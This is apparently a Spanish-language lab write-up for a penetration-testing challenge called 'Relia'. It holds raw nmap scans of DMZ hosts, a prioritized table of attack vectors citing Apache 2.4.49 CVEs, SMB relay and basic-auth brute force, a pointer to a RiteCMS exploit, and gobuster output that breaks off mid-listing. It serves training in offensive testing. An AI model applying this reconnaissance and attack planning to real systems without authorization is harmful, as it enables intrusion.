# Challenge: Relia
## Fecha: 03/06/2025
## Host:[]
> El tercer octeto de la ip suele cambiar al reiniciar el laboratorio
## IPs:
```bash
# DMZ red 1 
192.168.231.249
192.168.231.248
192.168.231.247
192.168.231.246
192.168.231.245
192.168.231.191
192.168.231.189
192.168.231.250

# RELIA - interna red 2
172.16.191.6
172.16.191.21
172.16.191.19
172.16.191.15
172.16.191.30
172.16.191.14
172.16.191.20
```
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion de la DMZ
1. Enumeracion agresiva:
```bash
# Nmap 7.95 scan initiated Tue Jun  3 19:52:47 2025 as: /usr/lib/nmap/nmap -A -iL DMZ_ips.txt -oN enumerations/dmz-agresive.txt
Nmap scan report for 192.168.231.249
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T22:55:19+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:36+00:00
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2025-06-02T21:40:45
|_Not valid after:  2025-12-02T21:40:45
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.231.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=41425%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=10
OS:5%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=A)S
OS:EQ(SP=107%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=
OS:I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%
OS:O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:37
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   196.74 ms 192.168.45.1
2   246.36 ms 192.168.45.254
3   156.65 ms 192.168.251.1
4   157.03 ms 192.168.231.249

Nmap scan report for 192.168.231.248
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:24+00:00
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2025-06-02T21:40:44
|_Not valid after:  2025-12-02T21:40:44
|_ssl-date: 2025-06-03T22:55:19+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=33588%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=I%CI=I%TS=A)SEQ(SP=10
OS:3%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=A)S
OS:EQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=FD%GCD=1%ISR=FA%TI=I%CI=I%
OS:TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5
OS:=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=
OS:FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-06-03T22:54:30
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.94 ms 192.168.231.248

Nmap scan report for 192.168.231.247
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: RELIA - New Hire Information
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2025-04-23T04:53:29
|_Not valid after:  2025-10-23T04:53:29
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:32+00:00
|_ssl-date: 2025-06-03T22:55:20+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=37657%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=10
OS:6%GCD=1%ISR=104%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%TS=A)S
OS:EQ(SP=107%GCD=1%ISR=105%TI=I%CI=I%TS=A)SEQ(SP=FF%GCD=1%ISR=10A%TI=I%CI=I
OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:40
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   157.01 ms 192.168.231.247

Nmap scan report for 192.168.231.246
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
|_http-title: Code Validation
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.95 ms 192.168.231.246

Nmap scan report for 192.168.231.245
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.239
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.90 ms 192.168.231.245

Nmap scan report for 192.168.231.191
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.231.191
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T22:55:18+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=login.relia.com
| Not valid before: 2025-06-02T21:40:52
|_Not valid after:  2025-12-02T21:40:52
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:31+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=34306%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=FE%TI=I%CI=I%TS=A)SEQ(SP=102
OS:%GCD=1%ISR=10F%TI=I%CI=I%TS=A)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%TS=A)SE
OS:Q(SP=104%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I
OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.93 ms 192.168.231.191

Nmap scan report for 192.168.231.189
Host is up (0.15s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: OK QUOTA completed CHILDREN NAMESPACE CAPABILITY IDLE ACL RIGHTS=texkA0001 IMAP4rev1 SORT IMAP4
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=25%CT=1%CU=35361%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=A)SEQ(SP=10
OS:2%GCD=1%ISR=10F%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=A)S
OS:EQ(SP=10A%GCD=1%ISR=10C%TI=I%CI=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11
OS:%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW
OS:8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-03T22:54:53
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.94 ms 192.168.231.189

Nmap scan report for 192.168.231.250
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINPREP
|   NetBIOS_Domain_Name: WINPREP
|   NetBIOS_Computer_Name: WINPREP
|   DNS_Domain_Name: WINPREP
|   DNS_Computer_Name: WINPREP
|   Product_Version: 10.0.22000
|_  System_Time: 2025-06-03T22:54:28+00:00
| ssl-cert: Subject: commonName=WINPREP
| Not valid before: 2025-05-01T05:00:28
|_Not valid after:  2025-10-31T05:00:28
|_ssl-date: 2025-06-03T22:55:20+00:00; -1s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=135%CT=1%CU=43383%PV=Y%DS=4%DC=T%G=Y%TM=683F7D6
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=1
OS:03%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=103%GCD=1%ISR=10F%TI=I%CI=I%TS=A)
OS:SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10F%TI=I%CI
OS:=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11
OS:%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%
OS:W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-06-03T22:55:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.90 ms 192.168.231.250

Post-scan script results:
| clock-skew: 
|   -1s: 
|     192.168.231.248
|     192.168.231.191
|_    192.168.231.249
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## 📊 Análisis superficie de ataque priorizado.

### Hosts Ordenados por Prioridad de Ataque

#### PRIORIDAD ALTA

| IP | Hostname | Servicios Críticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.245 | RELIA | FTP (anon), HTTP, HTTPS, SSH | 21, 80, 443, 2222, 8000 | Web Server Principal | **FTP anónimo**, Apache 2.4.49 (CVE conocidos), mod_wsgi Python, SSH en puerto no estándar |
| 192.168.231.246 | demo | HTTP, HTTPS, SSH | 80, 443, 2222 | Servidor de Validación | **Code Validation** app, SSH puerto no estándar, posible upload/validation bypass |
| 192.168.231.249 | LEGACY | IIS, SMB, RDP, WinRM, XAMPP | 80, 135, 139, 445, 3389, 5985, 8000 | Servidor Legacy Windows | **XAMPP** dashboard, SMB shares, WinRM, método TRACE habilitado |

#### PRIORIDAD MEDIA

| IP | Hostname | Servicios Críticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.247 | WEB02 | Apache, SMB, RDP, WinRM | 80, 135, 139, 443, 445, 3389, 5985 | Web Server Secundario | **RELIA New Hire Info**, PHP 8.1.10, SMB enumeration, cert expirado SSL |
| 192.168.231.248 | EXTERNAL | IIS, SMB, RDP, WinRM | 80, 135, 139, 445, 3389, 5985 | Servidor Externo | **robots.txt** con 16 entradas, SMB shares, WinRM, método TRACE |
| 192.168.231.191 | login.relia.com (LOGIN) | IIS, SMB, RDP, WinRM | 80, 135, 139, 445, 3389, 5985 | Servidor de Login | **HTTP Basic Auth**, dominio relia.com, SMB domain controller potencial |

#### PRIORIDAD BAJA

| IP | Hostname | Servicios Críticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.189 | MAIL | SMTP, POP3, IMAP, SMB, WinRM | 25, 110, 135, 139, 143, 445, 587, 5985 | Servidor de Email | hMailServer, email enumeration, SMTP relay, SMB shares |
| 192.168.231.250 | WINPREP | SMB, RDP | 135, 139, 445, 3389 | Workstation/Prep | Windows 11 (build 22000), SMB shares, RDP |

### Vulnerabilidades Críticas Identificadas

#### Inmediatas
- **192.168.231.245**: FTP anónimo habilitado
- **192.168.231.249**: XAMPP dashboard expuesto en puerto 8000
- **192.168.231.191**: HTTP Basic Auth (posible brute force)

#### Apache Vulnerabilities
- **192.168.231.245**: Apache 2.4.49 - **CVE-2021-41773** (Path Traversal)
- **192.168.231.245**: Apache 2.4.49 - **CVE-2021-42013** (RCE)

#### Windows SMB
- Todos los hosts Windows tienen **SMB** sin firma requerida
- Posible **relay attacks** entre hosts del dominio

#### Estrategia de Enumeración Recomendada

1. **Comenzar con 192.168.231.245**: FTP anónimo + Apache vulnerable
2. **Enumerar 192.168.231.249**: XAMPP dashboard + SMB shares
3. **Verificar 192.168.231.246**: Aplicación de validación de código
4. **SMB enumeration**: Todos los hosts Windows para shares y usuarios
5. **Web enumeration**: Dirb/Gobuster en todos los servicios HTTP/HTTPS

### Notas Técnicas

- **Dominio identificado**: relia.com
- **Sistemas operativos**: Mix Windows Server 2022 y Ubuntu
- **Puertos SSH no estándar**: 2222 en hosts Linux
- **Certificados SSL**: Varios expirados o con CN incorrectos

Las pruebas sobre el servidor ftp dan como positivo el login anonimo pero los resultados **no ofrecen valor** _aun_.
No tenemos permisos para subir archivos, ni permisos de lectura de archivos.

Exploramos la posibilidad de Directory Traversal sin resultados.

Enumeramos directorios con gobuster y encontramos una ruta en **LEGACY** en el puerto 8000 que apunta a un cms **RiteCMS 3**
buscamos en [Exploit Database](https://www.exploit-db.com/exploits/50616) y encontramos un exploit para lograr **RCE** desde un usuario autenitcado.


```bash
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://192.168.161.249:8000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.161.249:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 307]
/.hta                 (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/.htaccess.txt        (Status: 403) [Size: 307]
